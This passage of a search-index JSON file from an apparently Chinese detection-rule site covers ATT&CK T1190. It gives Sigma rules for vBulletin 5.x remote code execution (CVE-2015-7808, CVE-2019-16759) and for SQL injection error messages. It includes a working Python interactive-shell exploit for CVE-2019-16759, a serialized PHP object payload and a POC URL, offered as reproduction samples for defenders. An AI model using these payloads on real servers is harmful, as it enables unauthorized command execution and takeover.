{\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = raw_input(\">>>Shell= \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"');echo md5('vBulletin'); exit;\" r = requests.post(url = sys.argv[1], data = params, proxies=proxies) if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.text: print print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0] else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\"\\nClosing shell...\") except Exception, e: sys.exit(str(e)) \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u4f46\u53ef\u67e5\u770b\u653b\u51fb\u62a5\u6587\u6837\u4f8b\u8f85\u52a9\u5b89\u5168\u4eba\u5458\u7814\u5224\u662f\u5426\u4e3a\u653b\u51fb\u884c\u4e3a\uff0c\u8f83\u7b80\u5355\u7684\u573a\u666f\u3002 https://github.com/jas502n/CVE-2019-16759 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: vBulletin5.X-CVE-2015-7808-RCE-\u68c0\u6d4b\u89c4\u5219 description: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7\u68c0\u6d4bCVE-2015-7808\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a translator: 12306Bro date: 2020/12/16 status: experimental references: - https://github.com/jas502n/CVE-2019-16759 - https://blog.csdn.net/weixin_41064688/article/details/108060313 logsource: category: webserver detection: selection1: c-uri: - '*?routestring=ajax%2Frender%2Fwidget_php&widgetConfig*' #\u5339\u914d\u6b64\u7279\u5f81 selection2: body: - '*routestring=ajax/render/widget_php&widgetConfig[code]=die(@mid5(*))' #\u6839\u636e\u62a5\u6587\u5185\u5bb9\u8fdb\u884c\u5224\u65ad\uff0c\u591a\u4e3apost condition: selection1 or selection2 fields: - c-ip - c-dns falsepositives: - Unknown level: critical \u5907\u6ce8 \u5728\u8fdb\u884c\u90e8\u5206\u653b\u51fb\u65e5\u5fd7\u5206\u6790\u65f6\uff0c\u9047\u5230\u6b64\u6f0f\u6d1e\u7279\u5f81\uff0c\u4ec5\u505a\u8bb0\u5f55\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ vBulletin5.X\u524d\u53f0RCE\u5206\u6790\uff08CVE-2015-7808\uff09 https://xz.aliyun.com/t/6497 vBulletin 5 \u5168\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/82870 CVE-2019-16759\u6f0f\u6d1e\u5728\u91ce\u5229\u7528 https://www.anquanke.com/post/id/189470 CVE-2019-16759 vBulletin 5.x RCE \u590d\u73b0 https://blog.csdn.net/weixin_41064688/article/details/108060313 CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e https://github.com/jas502n/CVE-2019-16759","title":"T1190-vBulletin5.X-RCE\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#t1190-vbulletin5x-rce","text":"","title":"T1190-vBulletin5.X-RCE\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#cve-2015-7808","text":"vBulletin\u662f\u7528PHP\u7f16\u5199\u7684\u53ef\u5b9a\u5236\u7684\u8bba\u575b\u7a0b\u5e8f\u5957\u4ef6\u3002 vBulletin 5.1.4-5.1.9\u7248\u672c\uff0c\u67d0\u4e9b\u5185\u90e8API\u5904\u7406Ajax\u8bf7\u6c42\u65f6\uff0c\u672a\u9a8c\u8bc1\u5176\u6765\u6e90\uff0c\u8fd9\u53ef\u4f7f\u653b\u51fb\u8005\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u8c03\u7528\u7ee7\u627f\u81eavB_Api\u53ca/core/vb/api/\u4e0b\u4efb\u610f\u7c7b\u7684\u4efb\u610f\u516c\u5171\u65b9\u6cd5\uff0c\u5176\u4e2ddecodeArguments()\u65b9\u6cd5\u5185\u7684unserialize()\u51fd\u6570\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u4f7f\u653b\u51fb\u8005\u5728\u2018$args\u2019\u53d8\u91cf\u4e2d\u6ce8\u5165\u7cbe\u5fc3\u6784\u9020\u7684\u4efb\u610f\u5bf9\u8c61\uff0c\u8fdc\u7a0b\u6267\u884cphp\u4ee3\u7801\uff0c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002","title":"CVE-2015-7808\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_1","text":"VBulletin 5.1.4 - 5.1.9","title":"\u5f71\u54cd\u7248\u672c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_2","text":"\u8bf7\u53c2\u8003\uff1a vBulletin5.X\u524d\u53f0RCE\u5206\u6790\uff08CVE-2015-7808\uff09 https://xz.aliyun.com/t/6497 vBulletin 5 \u5168\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/82870","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_3","text":"\u8bbf\u95ee\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_4","text":"GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D HTTP/1.1 Host: 192.168.0.106 Cookie: XDEBUG_SESSION=PHPSTORM Connection: close \u89e3\u7801\u540e\uff1a GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O:12:\"vB_dB_Result\":2:{s:5:\"*db\";O:17:\"vB_Database_MySQL\":1:{s:9:\"functions\";a:1:{s:11:\"free_result\";s:6:\"assert\";}}s:12:\"*recordset\";s:9:\"phpinfo()\";} HTTP/1.1","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_5","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_6","text":"sigma\u89c4\u5219 title: vBulletin5.X-CVE-2015-7808-RCE-\u68c0\u6d4b\u89c4\u5219 description: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7\u68c0\u6d4bCVE-2015-7808\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a translator: 12306Bro date: 2020/12/16 status: experimental references: - https://xz.aliyun.com/t/6497 logsource: category: webserver detection: selection: c-uri: - '*/ajax/api/hook/decodeArguments?arguments=*' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#cve-2019-16759","text":"\u8fd1\u671f\uff0cvBulletin\u62ab\u9732\u4e86\u4e00\u4e2a\u6700\u65b0\u76840 day\u6f0f\u6d1e\u7ec6\u8282\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5206\u914d\u7684CVE\u7f16\u53f7\u4e3aCVE-2019-16759\u3002\u4e0e\u6b64\u540c\u65f6\uff0cUnit 42\u7684\u5b89\u5168\u7814\u7a76\u4eba\u5458\u4e5f\u5728\u7f51\u4e0a\u53d1\u73b0\u4e86\u6709\u5f88\u591a\u653b\u51fb\u8005\u6b63\u5728\u5229\u7528\u8be5\u6f0f\u6d1e\u6765\u5b9e\u65bd\u653b\u51fb\u3002\u5728\u8be5\u6f0f\u6d1e\u7684\u5e2e\u52a9\u4e0b\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u5c06\u80fd\u591f\u8bbf\u95ee\u548c\u63a7\u5236\u8fd0\u884c\u4e86v5.0.0\u81f3v5.5.4\u7248\u672cvBulletin\u7684\u670d\u52a1\u5668\uff0c\u5e76\u4e14\u963b\u6b62\u7f51\u7edc\u7ba1\u7406\u5458\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\u5668\u3002\u76ee\u524d\uff0c\u4f7f\u7528\u4e86vBulletin\u7684\u7f51\u7ad9\u6570\u91cf\u5927\u7ea6\u670910\u4e07\u591a\u4e2a\uff0c\u5176\u4e2d\u5305\u62ec\u5f88\u591a\u5927\u578b\u4f01\u4e1a\u3001\u7ec4\u7ec7\u548c\u8bba\u575b\uff0c\u56e0\u6b64\u8be5\u6f0f\u6d1e\u5e94\u5f53\u7acb\u523b\u88ab\u4fee\u590d\u3002","title":"CVE-2019-16759"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_7","text":"\u4ec5\u5f71\u54cd vBulletin 5.x \u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_8","text":"\u8bf7\u53c2\u8003\uff1a CVE-2019-16759\u6f0f\u6d1e\u5728\u91ce\u5229\u7528 https://www.anquanke.com/post/id/189470 CVE-2019-16759 vBulletin 5.x RCE \u590d\u73b0 https://blog.csdn.net/weixin_41064688/article/details/108060313 CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e https://github.com/jas502n/CVE-2019-16759","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_9","text":"\u8bbf\u95ee\u65e5\u5fd7 OR HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_10","text":"POC1 http://IP/?routestring=ajax%2Frender%2Fwidget_php&widgetConfig[code]=phpinfo();exit; POC2:CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s <URL to vBulletin>\" % sys.argv[0]) proxies ={ \"http\":\"http://127.0.0.1:8080/\" } params = {\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = raw_input(\">>>Shell= \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"');echo md5('vBulletin'); exit;\" r = requests.post(url = sys.argv[1], data = params, proxies=proxies) if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.text: print print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0] else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\"\\nClosing shell...\") except Exception, e: sys.exit(str(e))","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_11","text":"\u6682\u65e0\uff0c\u4f46\u53ef\u67e5\u770b\u653b\u51fb\u62a5\u6587\u6837\u4f8b\u8f85\u52a9\u5b89\u5168\u4eba\u5458\u7814\u5224\u662f\u5426\u4e3a\u653b\u51fb\u884c\u4e3a\uff0c\u8f83\u7b80\u5355\u7684\u573a\u666f\u3002 https://github.com/jas502n/CVE-2019-16759","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_12","text":"sigma\u89c4\u5219 title: vBulletin5.X-CVE-2015-7808-RCE-\u68c0\u6d4b\u89c4\u5219 description: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7\u68c0\u6d4bCVE-2015-7808\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a translator: 12306Bro date: 2020/12/16 status: experimental references: - https://github.com/jas502n/CVE-2019-16759 - https://blog.csdn.net/weixin_41064688/article/details/108060313 logsource: category: webserver detection: selection1: c-uri: - '*?routestring=ajax%2Frender%2Fwidget_php&widgetConfig*' #\u5339\u914d\u6b64\u7279\u5f81 selection2: body: - '*routestring=ajax/render/widget_php&widgetConfig[code]=die(@mid5(*))' #\u6839\u636e\u62a5\u6587\u5185\u5bb9\u8fdb\u884c\u5224\u65ad\uff0c\u591a\u4e3apost condition: selection1 or selection2 fields: - c-ip - c-dns falsepositives: - Unknown level: critical","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_13","text":"\u5728\u8fdb\u884c\u90e8\u5206\u653b\u51fb\u65e5\u5fd7\u5206\u6790\u65f6\uff0c\u9047\u5230\u6b64\u6f0f\u6d1e\u7279\u5f81\uff0c\u4ec5\u505a\u8bb0\u5f55\u3002","title":"\u5907\u6ce8"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_14","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ vBulletin5.X\u524d\u53f0RCE\u5206\u6790\uff08CVE-2015-7808\uff09 https://xz.aliyun.com/t/6497 vBulletin 5 \u5168\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/82870 CVE-2019-16759\u6f0f\u6d1e\u5728\u91ce\u5229\u7528 https://www.anquanke.com/post/id/189470 CVE-2019-16759 vBulletin 5.x RCE \u590d\u73b0 https://blog.csdn.net/weixin_41064688/article/details/108060313 CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e https://github.com/jas502n/CVE-2019-16759","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/","text":"T1190-\u53ef\u7591\u7684SQL\u9519\u8bef\u6d88\u606f ATT&CK\u63cf\u8ff0 \u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u5229\u7528\u6307\u7684\u662f\u653b\u51fb\u8005\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u7684\u5f31\u70b9\uff0c\u4f7f\u7528\u8f6f\u4ef6\u3001\u6570\u636e\u6216\u547d\u4ee4\u6765\u9020\u6210\u610f\u5916\u884c\u4e3a\u3002\u7cfb\u7edf\u5f31\u70b9\u53ef\u80fd\u662f\u7f3a\u9677\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u4e5f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u5982SMB\u6216SSH\uff09\uff0c\u4ee5\u53ca\u4efb\u4f55\u5e26\u6709\u53ef\u901a\u8fc7Internet\u8bbf\u95ee\u7684\u5f00\u653e\u5957\u63a5\u5b57\u7684\u5e94\u7528\uff08\u5982web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\uff09\u3002\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u5229\u7528\u53ef\u80fd\u5305\u62ec\u9632\u5fa1\u9003\u9038\u76ee\u7684\u7684\u5229\u7528\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u88ab\u5229\u7528\u7684\u5f31\u70b9\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u4e91\u5316\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5229\u7528\u6b64\u5e94\u7528\u53ef\u80fd\u4f1a\u7834\u574f\u5e95\u5c42\u5b9e\u4f8b\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u6f0f\u6d1e\u901a\u8fc7\u8c03\u7528\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u6765\u5b9e\u65bd\u653b\u51fb\u3002 OWASP\uff08\u5f00\u653e\u5f0fweb\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u9879\u76ee\uff09\u524d10\u540d\u548cCWE\uff08\u901a\u7528\u7f3a\u9677\u5217\u8868\uff09\u524d25\u540d\u7a81\u51fa\u663e\u793a\u4e86\u7f51\u7ad9\u548c\u6570\u636e\u5e93\u6700\u5e38\u89c1\u7684web\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u6570\u636e\u5e93\u9519\u8bef\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 Oracle\u62a5\u9519\u4fe1\u606f quoted string not properly terminated MySQL\u62a5\u9519\u4fe1\u606f You have an error in your SQL syntax SQL Server\u62a5\u9519\u4fe1\u606f Unclosed quotation mark SQLite\u62a5\u9519\u4fe1\u606f 'near \"*\": syntax error' SELECTs to the left and right of UNION do not have the same number of result columns \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: \u53ef\u7591\u7684SQL\u9519\u8bef\u6d88\u606f status: \u5b9e\u9a8c\u9636\u6bb5 description: \u68c0\u6d4b\u6307\u793a\u5bf9\u6ce8\u5165\u653b\u51fb\u8fdb\u884c\u63a2\u6d4b\u7684SQL\u9519\u8bef\u6d88\u606f author: Bjoern Kimminich Translator: 12306Bro date: 2020/8/6 references: - http://www.sqlinjection.net/errors logsource: category: application product: sql detection: keywords: # Oracle - quoted string not properly terminated # MySQL - You have an error in your SQL syntax # SQL Server - Unclosed quotation mark # SQLite - 'near \"*\": syntax error' - SELECTs to the left and right of UNION do not have the same number of result columns condition: keywords falsepositives: - Application bugs level: high \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Oracle\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/rshp_520/article/details/44620463 MySQL\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/attack_5/article/details/83548346 SQL Server\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/dadaowuque/article/details/81016127 SQLite\u62a5\u9519\u4fe1\u606f https://blog.csdn.net/www121104115/article/details/75051685","title":"T1190-\u53ef\u7591\u7684SQL\u9519\u8bef\u6d88\u606f"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#t1190-sql","text":"","title":"T1190-\u53ef\u7591\u7684SQL\u9519\u8bef\u6d88\u606f"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#attck","text":"\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u5229\u7528\u6307\u7684\u662f\u653b\u51fb\u8005\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u7684\u5f31\u70b9\uff0c\u4f7f\u7528\u8f6f\u4ef6\u3001\u6570\u636e\u6216\u547d\u4ee4\u6765\u9020\u6210\u610f\u5916\u884c\u4e3a\u3002\u7cfb\u7edf\u5f31\u70b9\u53ef\u80fd\u662f\u7f3a\u9677\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u4e5f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u5982SMB\u6216SSH\uff09\uff0c\u4ee5\u53ca\u4efb\u4f55\u5e26\u6709\u53ef\u901a\u8fc7Internet\u8bbf\u95ee\u7684\u5f00\u653e\u5957\u63a5\u5b57\u7684\u5e94\u7528\uff08\u5982web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\uff09\u3002\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u5229\u7528\u53ef\u80fd\u5305\u62ec\u9632\u5fa1\u9003\u9038\u76ee\u7684\u7684\u5229\u7528\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u88ab\u5229\u7528\u7684\u5f31\u70b9\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u4e91\u5316\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5229\u7528\u6b64\u5e94\u7528\u53ef\u80fd\u4f1a\u7834\u574f\u5e95\u5c42\u5b9e\u4f8b\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u6f0f\u6d1e\u901a\u8fc7\u8c03\u7528\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u6765\u5b9e\u65bd\u653b\u51fb\u3002 OWASP\uff08\u5f00\u653e\u5f0fweb\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u9879\u76ee\uff09\u524d10\u540d\u548cCWE\uff08\u901a\u7528\u7f3a\u9677\u5217\u8868\uff09\u524d25\u540d\u7a81\u51fa\u663e\u793a\u4e86\u7f51\u7ad9\u548c\u6570\u636e\u5e93\u6700\u5e38\u89c1\u7684web\u6f0f\u6d1e\u3002","title":"ATT&amp;CK\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_2","text":"\u6570\u636e\u5e93\u9519\u8bef\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_4","text":"Oracle\u62a5\u9519\u4fe1\u606f quoted string not properly terminated MySQL\u62a5\u9519\u4fe1\u606f You have an error in your SQL syntax SQL Server\u62a5\u9519\u4fe1\u606f Unclosed quotation mark SQLite\u62a5\u9519\u4fe1\u606f 'near \"*\": syntax error' SELECTs to the left and right of UNION do not have the same number of result columns","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#sigma","text":"title: \u53ef\u7591\u7684SQL\u9519\u8bef\u6d88\u606f status: \u5b9e\u9a8c\u9636\u6bb5 description: \u68c0\u6d4b\u6307\u793a\u5bf9\u6ce8\u5165\u653b\u51fb\u8fdb\u884c\u63a2\u6d4b\u7684SQL\u9519\u8bef\u6d88\u606f author: Bjoern Kimminich Translator: 12306Bro date: 2020/8/6 references: - http://www.sqlinjection.net/errors logsource: category: application product: sql detection: keywords: # Oracle - quoted string not properly terminated # MySQL - You have an error in your SQL syntax # SQL Server - Unclosed quotation mark # SQLite - 'near \"*\": syntax error' - SELECTs to the left and right of UNION do not have the same number of result columns condition: keywords falsepositives: - Application bugs level: 